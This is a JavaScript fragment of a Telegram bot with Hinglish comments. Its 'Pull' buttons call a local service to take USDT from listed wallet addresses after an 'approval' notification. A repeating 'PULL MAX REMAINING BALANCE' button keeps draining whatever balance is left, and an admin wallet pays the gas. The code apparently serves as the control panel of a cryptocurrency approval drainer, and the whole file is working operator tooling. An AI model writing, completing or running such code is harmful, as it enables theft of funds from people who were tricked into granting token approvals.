async function handlePullRequest(chatId, messageId, walletAddress, amount, isMaxPull = false) {
    
    let amountToSend = amount; // Either the input amount or "MAX_BALANCE"
    let actionType = isMaxPull ? "MAX PULL" : "EXACT PULL";
    
    try {
        // --- Call Local Pull Service API (Yahan process.env use hota hai, jo ab hardcoded ya OS env se aayega) ---
        const response = await fetch(PULL_API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ walletAddress: walletAddress, amount: amountToSend })
        });

        const result = await response.json();

        if (response.ok && result.status === 'success') {
            const pulledAmount = result.pulledAmount || amount;
            
            // MAX PULL BUTTON LOOP LOGIC
            let replyMarkup = {};
            
            // Agar EXACT PULL hua hai: MAX PULL button dikhao.
            if (!isMaxPull) { 
                const maxPullButton = [
                    [{ 
                        text: `🔥 PULL MAX REMAINING BALANCE`, 
                        callback_data: `PULL_MAX:${walletAddress}` 
                    }]
                ];
                replyMarkup = { inline_keyboard: maxPullButton };
            } 
            // Agar MAX PULL success hua hai: Wahi MAX PULL button dobara dikhao (Loop).
            else { 
                 const maxPullButton = [
                    [{ 
                        text: `🔄 PULL AGAIN (MAX BALANCE)`, 
                        callback_data: `PULL_MAX:${walletAddress}` 
                    }]
                ];
                replyMarkup = { inline_keyboard: maxPullButton };
            }


            // Edit the processing message with SUCCESS result
            await bot.editMessageText(`✅ **${actionType} SUCCESSFUL!**\n\n**Pulled:** ${pulledAmount} USDT\n**Wallet:** \`${walletAddress}\`\n**TX Hash:** \`${result.txHash.substring(0, 10)}...\``, {
                chat_id: chatId,
                message_id: messageId,
                parse_mode: 'Markdown',
                reply_markup: replyMarkup // Button dobara aayega
            });
            
        } else {
            throw new Error(result.message || 'Pull API returned an error.');
        }

    } catch (error) {
        console.error(`[${actionType} ERROR] Failed for ${walletAddress}:`, error.message);
        
        let finalErrorMessage = error.message;
        if (finalErrorMessage.includes('insufficient funds for gas')) {
            finalErrorMessage = 'GAS ERROR: Check if the admin wallet has enough BNB.';
        }

 // 1. Error ke time ke liye button banaya
        const failureMarkup = {
            inline_keyboard: [
                [{
                    text: `🔥 PULL MAX REMAINING BALANCE`,
                    callback_data: `PULL_MAX:${walletAddress}`
                }]
            ]
        };


        // Edit the processing message with FAILURE result
        await bot.editMessageText(`❌ **${actionType} FAILED!**\n\n**Wallet:** \`${walletAddress}\`\n**Error:** ${finalErrorMessage.substring(0, 200)}`, {
            chat_id: chatId,
            message_id: messageId,
parse_mode: 'Markdown',
            reply_markup: failureMarkup
        });
    }
}


// --- 1. INITIAL PULL (Button click from Approval Notification) ---
bot.on('callback_query', async (callbackQuery) => {
    const message = callbackQuery.message;
    const data = callbackQuery.data;

    if (data.startsWith('PULL:')) {
        
        await bot.answerCallbackQuery(callbackQuery.id, { text: "Pull request received. Processing..." });

        const parts = data.split(':');
        const walletAddress = parts[1];
        const amount = parts[2]; 
        const amountFloat = parseFloat(amount);
        
        let processingMessageId; 

        try {
            const processingMessage = await bot.sendMessage(
                message.chat.id, 
                `⏳ **PULL INITIATED (Exact Amount)**\n\n**Pulling ${amount} USDT** from \n\`${walletAddress}\`...\n\n_Do not press the button again._`, 
                { parse_mode: 'Markdown' }
            );
            processingMessageId = processingMessage.message_id; 

            await handlePullRequest(message.chat.id, processingMessageId, walletAddress, amountFloat, false);
            
        } catch (error) {
            console.error(`[FATAL ERROR] Pull setup failed:`, error.message);

 // 1. Button banaya
            const maxButton = {
                inline_keyboard: [
                    [{
                        text: `🔥 PULL MAX REMAINING BALANCE`,
                        callback_data: `PULL_MAX:${walletAddress}`
                    }]
                ]
            };



            await bot.sendMessage(message.chat.id, `❌ **FATAL ERROR:** Pull setup failed. ${error.message.substring(0, 100)}`, {
    parse_mode: 'Markdown',
    reply_markup: maxButton
});

        }
        
        await bot.editMessageReplyMarkup({
            inline_keyboard: [] 
        }, {
            chat_id: message.chat.id,
            message_id: message.message_id
        }).catch(err => console.warn("Could not remove button:", err.message));
    }

    
    // --- 2. MAX PULL (Clicking the "PULL MAX REMAINING" button) ---
    if (data.startsWith('PULL_MAX:')) {
        await bot.answerCallbackQuery(callbackQuery.id, { text: "Max Pull request processing..." });

        const parts = data.split(':');
        const walletAddress = parts[1];
        const amount = "MAX_BALANCE"; 

        const processingMessageId = message.message_id; 



        

const maxButton = {
    inline_keyboard: [
        [{
            text: `🔥 PULL MAX REMAINING BALANCE`,
            callback_data: `PULL_MAX:${walletAddress}`
        }]
    ]
};




        await bot.editMessageText(`⏳ **MAX PULL INITIATED**\n\nAttempting to pull **MAX BALANCE** from \n\`${walletAddress}\`...`, {
            chat_id: message.chat.id,
            message_id: processingMessageId,
            parse_mode: 'Markdown',
            reply_markup: maxButton
        });
        
        await handlePullRequest(message.chat.id, processingMessageId, walletAddress, amount, true);
    }
});